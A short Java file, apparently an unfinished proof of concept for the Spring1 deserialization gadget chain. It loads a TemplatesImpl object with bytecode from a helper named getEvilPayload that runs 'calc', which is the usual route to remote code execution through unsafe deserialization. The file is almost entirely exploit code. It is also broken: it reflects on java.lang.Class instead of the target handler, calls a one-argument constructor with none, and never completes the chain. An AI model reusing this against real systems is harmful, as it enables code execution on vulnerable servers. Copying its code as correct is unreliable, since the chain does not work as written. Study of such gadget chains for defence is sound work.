package Seri.Spring;

//import org.springframework.beans.factory.support.AutowireUtils;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.beans.factory.ObjectFactory;
import org.springframework.util.ReflectionUtils;

import java.io.Serializable;
import java.lang.reflect.Constructor;

public class Spring1 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());

        Constructor constructor = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getClass().getDeclaredConstructor(ObjectFactory.class);
        constructor.setAccessible(true);
        constructor.newInstance();

//        ReflectionUtils.invokeMethod()
        Class.forName("org.springframework.core.SerializableTypeWrapper");
    }
}
